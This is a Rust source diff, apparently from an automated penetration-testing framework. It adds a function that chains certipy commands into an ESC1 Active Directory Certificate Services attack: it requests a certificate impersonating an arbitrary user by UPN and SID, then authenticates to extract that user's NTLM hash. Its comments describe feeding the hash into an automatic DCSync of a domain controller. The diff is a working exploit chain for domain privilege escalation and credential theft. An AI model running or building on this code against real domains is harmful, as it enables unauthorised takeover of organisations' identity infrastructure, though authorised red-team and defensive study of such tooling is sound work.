@@ -761,6 +761,95 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
     })
 }
 
+/// Single-spawn ESC1 chain: request an ESC1 cert with an arbitrary UPN+SID,
+/// then authenticate it to obtain the impersonated principal's NTLM hash.
+///
+/// The two steps must share CWD because `certipy auth` derives its ccache
+/// filename from the cert subject and won't overwrite. The combined output
+/// lets a downstream parser extract the resulting hash and publish it to
+/// state as a regular `Hash` discovery — `auto_credential_reuse` then
+/// DCSyncs the foreign DC with that hash without any further automation.
+///
+/// Required args: `username`, `domain`, `password`, `ca`, `template`,
+///                `dc_ip`, `upn`, `sid`
+/// Optional args: `target` (CA server hostname/IP — required when the CA
+///                runs on a host other than the DC, as with most multi-tier
+///                AD deployments).
+pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
+    let username = required_str(args, "username")?;
+    let domain = required_str(args, "domain")?;
+    let password = required_str(args, "password")?;
+    let ca = required_str(args, "ca")?;
+    let template = required_str(args, "template")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let upn = required_str(args, "upn")?;
+    let sid = required_str(args, "sid")?;
+    let target = optional_str(args, "target")
+        .or_else(|| optional_str(args, "ca_host"))
+        .or_else(|| optional_str(args, "target_ip"));
+
+    let user_at_domain = format!("{username}@{domain}");
+    let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC1 chain")?;
+    let cwd = tempdir.path().to_path_buf();
+
+    let ts = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_millis())
+        .unwrap_or(0);
+    let out_name = format!("esc1_{ts}");
+    let pfx_name = format!("{out_name}.pfx");
+
+    // --- Step 1: request the cert with -upn + -sid for KB5014754 strict mapping ---
+    let request_output = CommandBuilder::new("certipy")
+        .arg("req")
+        .flag("-username", &user_at_domain)
+        .flag("-password", password)
+        .flag("-ca", ca)
+        .flag("-template", template)
+        .flag("-dc-ip", dc_ip)
+        .flag("-upn", upn)
+        .flag("-sid", sid)
+        .flag("-out", &out_name)
+        .flag_opt("-target", target)
+        .current_dir(&cwd)
+        .timeout_secs(180)
+        .execute()
+        .await?;
+    if !request_output.success {
+        return Ok(request_output);
+    }
+    if !cwd.join(&pfx_name).exists() {
+        anyhow::bail!("certipy req reported success but {pfx_name} was not produced");
+    }
+
+    // --- Step 2: authenticate with the cert → NTLM hash ---
+    let auth_output = CommandBuilder::new("certipy")
+        .arg("auth")
+        .flag("-pfx", &pfx_name)
+        .flag("-dc-ip", dc_ip)
+        .flag("-domain", domain)
+        .current_dir(&cwd)
+        .timeout_secs(120)
+        .execute()
+        .await?;
+
+    let combined_stdout = format!(
+        "=== Step 1: certipy req (ESC1, upn={upn}, sid={sid}) ===\n{}\n\
+         === Step 2: certipy auth ({pfx_name}) ===\n{}",
+        request_output.stdout, auth_output.stdout
+    );
+    let combined_stderr = format!(
+        "=== Step 1 stderr ===\n{}\n=== Step 2 stderr ===\n{}",
+        request_output.stderr, auth_output.stderr
+    );
+    Ok(ToolOutput {
+        stdout: combined_stdout,
+        stderr: combined_stderr,
+        exit_code: auth_output.exit_code,
+        success: request_output.success && auth_output.success,
+    })
+}
+
 #[cfg(test)]
 mod tests {
     use crate::args::{optional_bool, optional_str, required_str};
